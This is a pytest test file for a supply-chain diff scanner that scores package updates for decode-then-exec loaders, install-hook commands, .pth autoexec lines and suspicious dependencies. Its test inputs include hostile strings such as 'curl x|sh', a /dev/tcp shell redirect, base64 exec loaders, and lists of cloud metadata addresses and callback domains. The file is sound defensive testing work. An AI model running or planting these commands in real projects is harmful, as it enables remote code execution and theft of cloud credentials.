from pathlib import Path
from pydiffwatch import rules as rules_mod
from pydiffwatch.rules import load_rules
from pydiffwatch.engine import triage
from pydiffwatch.config import Config
from pydiffwatch.models import Diff, FileDiff, Hunk

RULES = load_rules(Path("rules/community"))


def _code(path, added):
    return Diff("p", "1.1", False, [FileDiff(path, "modified",
        [Hunk((0, 0), (0, len(added)), added, [])], "\n".join(added))], [])


def test_all_shipped_rules_valid_and_no_crownjewel():
    ids = {r.id for r in RULES}
    expected = {"syntax-error-suspicious", "primitives", "autoexec-location", "combo-fetch-exec",
                "combo-decode-exec", "combo-cred-network", "binary-source-too-large",
                "foreign-language-source", "binary-new-binary", "dep-typosquat", "dep-nonexistent",
                "dep-brand-new", "maintainer-set-change", "combo-decode-run", "syntax-newer-than-runtime",
                "py-install-code-dangerous", "encoded-url-literal"}
    assert expected <= ids, f"missing: {expected - ids}"
    assert "obfuscated-loader" not in ids   # crown jewel (decode->exec taint) is NOT shipped


def test_no_rule_was_dropped_as_invalid():
    # every shipped YAML rule must pass validation (load_rules silently drops invalid ones)
    assert len(RULES) == 17


def test_install_hook_escalates():
    assert triage(_code("setup.py", ["import os", "os.system('curl x|sh')"]), Config(), RULES).escalate


def test_install_hook_escalates_the_same_for_an_uppercase_py_extension():
    # An in-cap EVIL.PY enters fetcher's `files` (fetcher._is_source lowercases), so it must be
    # scored and ranked as code identically to evil.py -- not silently treated as a non-code file.
    added = ["import os", "os.system('curl x|sh')"]
    lower = triage(_code("p/evil.py", added), Config(), RULES)
    upper = triage(_code("p/EVIL.PY", added), Config(), RULES)
    assert {fr.rule for fr in lower.fired_rules} == {fr.rule for fr in upper.fired_rules}
    assert lower.score == upper.score


def test_benign_refactor_does_not_escalate():
    r = triage(_code("m/x.py", ["import re, json", "re.compile(P)", "json.loads(B)"]), Config(), RULES)
    assert not r.escalate


def test_decode_exec_combo_escalates():
    r = triage(_code("m/__init__.py", ["import base64", "exec(base64.b64decode(B))"]), Config(), RULES)
    assert r.escalate and any(fr.rule == "combo-decode-exec" for fr in r.fired_rules)


def test_method_body_exec_not_autoexec_location():
    # aiops-ml shape: exec inside a method (only runs when called) must NOT fire autoexec-location even
    # in __init__.py. combo-decode-exec still fires (the co-occurrence is still worth review), so it
    # still escalates — only the false install-hook framing is dropped.
    full = ("import base64\n"
            "class Algo:\n"
            "    def on_transfer(self, p_code):\n"
            "        s = base64.b64decode(p_code)\n"
            "        exec(s)\n")
    d = Diff("p", "1.1", False, [FileDiff("pkg/__init__.py", "modified",
        [Hunk((0, 0), (0, len(full.splitlines())), full.splitlines(), [])], full)], [])
    r = triage(d, Config(), RULES)
    assert not any(fr.rule == "autoexec-location" for fr in r.fired_rules)
    assert any(fr.rule == "combo-decode-exec" for fr in r.fired_rules)


def test_dep_typosquat_escalates():
    d = Diff("p", "1.1", False, [], [], added_dep_findings=[{"name": "reqursts", "reason": "typosquat"}])
    assert triage(d, Config(), RULES).escalate


def test_two_foreign_files_escalate():
    d = Diff("p", "1.1", False, [], [{"path": "a.php", "reason": "foreign-language-source"},
                                     {"path": "b.php", "reason": "foreign-language-source"}])
    assert triage(d, Config(), RULES).escalate


def test_tests_dir_does_not_escalate():
    # same dangerous call under tests/ stays low (location 0.2) — autoexec needs location>=3
    assert not triage(_code("tests/t.py", ["import os", "os.system('x')"]), Config(), RULES).escalate


def test_post_parse_crash_fires_syntax_error_rule_scaled_by_location():
    # A 5,000-term wide expression parses fine but used to RecursionError in the post-parse walk,
    # skipping straight to a silent gave_up. It must instead surface as syntax_error=True, which
    # scales syntax-error-suspicious (weight 20) by location_weight: 3.0 for __init__.py, 1.0 elsewhere.
    src = "x = " + "+".join(["1"] * 5000)
    full = src.splitlines()

    def _wholefile(path, added):
        return Diff("p", "1.1", False, [FileDiff(path, "modified",
            [Hunk((0, 0), (0, len(added)), added, [])], "\n".join(added))], [])

    r_init = triage(_wholefile("m/__init__.py", full), Config(), RULES)
    fr_init = next(fr for fr in r_init.fired_rules if fr.rule == "syntax-error-suspicious")
    assert fr_init.weight == 20 * 3.0

    r_other = triage(_wholefile("pkg/util.py", full), Config(), RULES)
    fr_other = next(fr for fr in r_other.fired_rules if fr.rule == "syntax-error-suspicious")
    assert fr_other.weight == 20 * 1.0


def test_pth_import_line_fires_autoexec_location():
    # A .pth file is a startup auto-exec location (site.py executes any `import` line at every
    # interpreter start). Added on an update -> autoexec-location must fire, same as setup.py.
    added = ["import os;os.system('id')"]
    d = Diff("p", "1.1", False, [FileDiff("evil.pth", "added",
        [Hunk((0, 0), (0, 1), added, [])], "\n".join(added))], [])
    r = triage(d, Config(), RULES)
    assert any(fr.rule == "autoexec-location" for fr in r.fired_rules)


def test_pth_bom_prefixed_import_line_fires_autoexec_location():
    # site.addpackage decodes .pth as utf-8-sig (strips a leading BOM); the scanner must too, or a
    # BOM-prefixed import line evades detection (fails startswith("import ")).
    added = ["import os;os.system('id')"]
    new_text = "﻿" + "\n".join(added)
    d = Diff("p", "1.1", False, [FileDiff("evil.pth", "added",
        [Hunk((0, 0), (0, 1), added, [])], new_text)], [])
    r = triage(d, Config(), RULES)
    assert any(fr.rule == "autoexec-location" for fr in r.fired_rules)


def test_deep_pad_does_not_mask_a_real_decode_exec_loader():
    # CRITICAL fix: previously the depth guard short-circuited extraction entirely, so padding a real
    # decode->exec loader with a deep expression dropped combo-decode-exec and the release stopped
    # escalating -- an evasion. The extraction must always run; the depth flag is additive only.
    pad = "+".join(["1"] * 5000)   # depth well past _MAX_AST_DEPTH -- syntax_error will also be set
    added = ["import base64", f"_pad = {pad}", "exec(base64.b64decode(d))"]
    d = Diff("p", "1.1", False, [FileDiff("pkg/util.py", "modified",
        [Hunk((0, 0), (0, len(added)), added, [])], "\n".join(added))], [])
    r = triage(d, Config(), RULES)
    assert any(fr.rule == "combo-decode-exec" for fr in r.fired_rules)
    assert r.escalate


def _many(n, lines):
    return Diff("p", "1.1", False, [FileDiff(f"pkg/m{i}.py", "modified",
        [Hunk((0, 0), (0, len(lines)), lines, [])], "\n".join(lines)) for i in range(n)], [])


def test_primitives_is_capped_below_threshold():
    [prim] = [r for r in RULES if r.id == "primitives"]
    assert prim.max_total == 35 and prim.max_total < Config().threshold_t


def test_primitives_only_large_diff_does_not_escalate():
    r = triage(_many(30, ["import subprocess", "subprocess.run(['ls'])"]), Config(), RULES)
    assert {fr.rule for fr in r.fired_rules} == {"primitives"}
    assert len(r.fired_rules) == 30 and r.score <= 35 and not r.escalate


def test_primitives_plus_combo_still_escalates():
    d = _many(30, ["import subprocess", "subprocess.run(['ls'])"])
    d.changed.append(_code("pkg/x.py", ["import base64", "exec(base64.b64decode(B))"]).changed[0])
    r = triage(d, Config(), RULES)
    assert any(fr.rule == "combo-decode-exec" for fr in r.fired_rules) and r.escalate


def test_primitives_plus_autoexec_still_escalates():
    d = _many(30, ["import subprocess", "subprocess.run(['ls'])"])
    d.changed.append(_code("setup.py", ["import os", "os.system('curl x|sh')"]).changed[0])
    r = triage(d, Config(), RULES)
    assert any(fr.rule == "autoexec-location" for fr in r.fired_rules) and r.escalate


def test_nan_weight_catch_all_rule_is_dropped_so_escalation_survives(tmp_path):
    # A community catch-all with weight .nan would make every score NaN (NaN >= 40 is False) and fail
    # detection open. It must be dropped at load, so a known-escalating diff still escalates.
    import shutil
    for p in Path("rules/community").glob("*.yaml"):
        shutil.copy(p, tmp_path / p.name)
    (tmp_path / "zz-nan.yaml").write_text(
        "- id: nan-catch-all\n  applies_to: code\n  weight: .nan\n"
        "  match: {not: {syntax_error: true}}\n")
    rules = load_rules(tmp_path)
    assert "nan-catch-all" not in {r.id for r in rules} and len(rules) == len(RULES)
    assert triage(_code("setup.py", ["import os", "os.system('curl x|sh')"]), Config(), rules).escalate


def test_oversized_source_weight_equals_default_threshold():
    assert [r.weight for r in RULES if r.id == "binary-source-too-large"] == [Config().threshold_t]


def test_one_oversized_source_alone_escalates():
    d = Diff("p", "1.1", False, [], [{"path": "p/big.py", "size": 5_000_000, "reason": "source-too-large",
                                       "sha256": "ab"}])
    assert triage(d, Config(), RULES).escalate


def test_file_too_large_scores_nothing_but_is_a_valid_binary_reason():
    d = Diff("p", "1.1", False, [], [{"path": "d/x.bin", "size": 20_000_000, "reason": "file-too-large",
                                       "sha256": "ab"}])
    r = triage(d, Config(), RULES)
    assert r.score == 0 and not r.fired_rules
    assert "file-too-large" in rules_mod.BINARY_REASONS


# ---- PR D ----
import pytest
from pydiffwatch import facts as facts_mod


def _fires(diff, rule):
    return [f for f in triage(diff, Config(), RULES).fired_rules if f.rule == rule]


def _files(*pairs, rp=None):
    return Diff("p", "1.1", False, [FileDiff(p, "modified", [Hunk((0, 0), (0, len(a)), a, [])], "\n".join(a))
                                    for p, a in pairs], [], requires_python=rp)


@pytest.mark.parametrize("path,added", [
    ("pkg/m.py", ["import subprocess, base64", "subprocess.run(base64.b64decode(c), shell=True)"]),
    ("pkg/m.py", ["import os, zlib", "os.system(zlib.decompress(b))"]),
    ("pkg/m.py", ["import subprocess, codecs", 'subprocess.Popen(codecs.decode(s, "rot13"))']),
    ("conftest.py", ["import subprocess, base64", "subprocess.run(base64.b64decode(c), shell=True)"]),
])
def test_combo_decode_run_fires_and_escalates(path, added):
    assert _fires(_code(path, added), "combo-decode-run")
    assert triage(_code(path, added), Config(), RULES).escalate


@pytest.mark.parametrize("path,added", [
    ("pkg/m.py", ["import base64", "base64.b64decode(c)"]),
    ("pkg/m.py", ["import subprocess", "subprocess.run(c)"]),
    ("pkg/m.py", ["import pickle, subprocess", "subprocess.run(pickle.loads(b))"]),
    ("tests/test_m.py", ["import subprocess, base64", "subprocess.run(base64.b64decode(c), shell=True)"]),
])
def test_combo_decode_run_does_not_fire(path, added):
    assert not _fires(_code(path, added), "combo-decode-run")


def test_decode_process_and_exec_score_the_combo_once():
    d = _code("pkg/m.py", ["import subprocess, base64", "exec(base64.b64decode(c))", "subprocess.run(c)"])
    fired = triage(d, Config(), RULES).fired_rules
    assert [f.rule for f in fired if f.rule.startswith("combo-decode")] == ["combo-decode-exec"]
    assert sum(f.weight for f in fired if f.rule.startswith("combo-")) == 45


_INSTALL_STRINGS = ["curl x | sh", "curl x |bash", "exec 3<>/dev/tcp/1.2.3.4/80", "echo x | base64 -d",
                    "base64 --decode", "169.254.169.254", "100.100.100.200", "169.254.0.23",
                    "metadata.google.internal", "metadata.tencentyun.com", "nslookup x.example",
                    "a.oast.fun", "x.oastify.com", "burpcollaborator.net", "interact.sh", "dnslog.cn"]


@pytest.mark.parametrize("s", _INSTALL_STRINGS)
def test_py_install_code_dangerous_fires_in_setup_py(s):
    d = _code("setup.py", [f"CMD = {s!r}"])
    assert _fires(d, "py-install-code-dangerous") and triage(d, Config(), RULES).escalate


@pytest.mark.parametrize("path,line", [("setup.cfg", "cmd = curl x | sh"),
                                       ("hatch_build.py", "CMD = 'curl x | sh'"),
                                       ("x.pth", "import os; os.system('curl x | sh')")])
def test_py_install_code_dangerous_fires_in_other_build_files(path, line):
    assert _fires(_code(path, [line]), "py-install-code-dangerous")


@pytest.mark.parametrize("path,line", [("pkg/util.py", "CMD = 'curl x | sh'"),
                                       ("pyproject.toml", '[tool.poe.tasks] lint = "curl x | sh"'),
                                       ("setup.py", "CMD = 'a || shx'"), ("setup.py", "CMD = 'x | shasum'"),
                                       ("setup.py", "CMD = 'sha256sum x'")])
def test_py_install_code_dangerous_does_not_fire(path, line):
    assert not _fires(_code(path, [line]), "py-install-code-dangerous")


_URL_LINE = 'url_unformatted = "aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvZGF0YS5qc29u"'


def test_encoded_url_literal_escalates_in_code():
    assert [f.weight for f in _fires(_code("pkg/_connect.py", [_URL_LINE]), "encoded-url-literal")] == [45.0]
    assert triage(_code("pkg/_connect.py", [_URL_LINE]), Config(), RULES).escalate


def test_encoded_url_literal_is_gated_not_scaled():
    assert [f.weight for f in _fires(_code("setup.py", [_URL_LINE]), "encoded-url-literal")] == [45.0]
    assert not _fires(_code("tests/test_oauth.py", [_URL_LINE]), "encoded-url-literal")
    assert not triage(_code("tests/test_oauth.py", [_URL_LINE]), Config(), RULES).escalate


_BAD = ["def f(:", "    pass"]      # Ruling P1


def test_syntax_error_suspicious_skips_cython_and_skew(monkeypatch):
    monkeypatch.setattr(facts_mod, "RUNTIME", (3, 13))
    assert not _fires(_code("pkg/m.pyx", ["cdef int x = 1"]), "syntax-error-suspicious")
    assert not _fires(_files(("pkg/m.py", _BAD), rp=">=3.14"), "syntax-error-suspicious")
    assert [f.weight for f in _fires(_files(("pkg/__init__.py", _BAD), rp=">=3.14"), "syntax-error-suspicious")] == [60.0]


def test_syntax_newer_than_runtime(monkeypatch):
    monkeypatch.setattr(facts_mod, "RUNTIME", (3, 13))
    one = _files(("pkg/m.py", _BAD), rp=">=3.14")
    assert [f.weight for f in _fires(one, "syntax-newer-than-runtime")] == [10.0]
    assert not triage(one, Config(), RULES).escalate
    prims = [(f"pkg/p{i}.py", ["import os", "os.system(c)"]) for i in range(7)]      # primitives at its 35 cap
    with_prims = triage(_files(("pkg/m.py", _BAD), *prims, rp=">=3.14"), Config(), RULES)
    assert with_prims.escalate and with_prims.score == 45
    four = triage(_files(*[(f"pkg/m{i}.py", _BAD) for i in range(4)], rp=">=3.14"), Config(), RULES)
    assert four.escalate and four.score == 40
    assert [f.weight for f in _fires(_files(("tests/test_m.py", _BAD), rp=">=3.14"), "syntax-newer-than-runtime")] == [2.0]
    assert not _fires(_files(("pkg/__init__.py", _BAD), rp=">=3.14"), "syntax-newer-than-runtime")


def test_a_root_conftest_is_not_an_autoexec_location():
    d = _code("conftest.py", ["import os", "os.system(c)"])
    assert not _fires(d, "autoexec-location") and triage(d, Config(), RULES).score == 5


def test_a_same_owner_brand_new_dependency_does_not_escalate_alone():
    d = Diff("p", "1.1", False, [], [], added_dep_findings=[{"name": "compyps", "reason": "brand-new",
                                                             "same_owner": True}])
    t = triage(d, Config(), RULES)
    assert t.score == 20 and not t.escalate


def test_a_cleared_dependency_fires_no_dep_rule():
    t = triage(Diff("p", "1.1", False, [], [], added_dep_findings=[]), Config(), RULES)
    assert not [f for f in t.fired_rules if f.rule.startswith("dep-")]
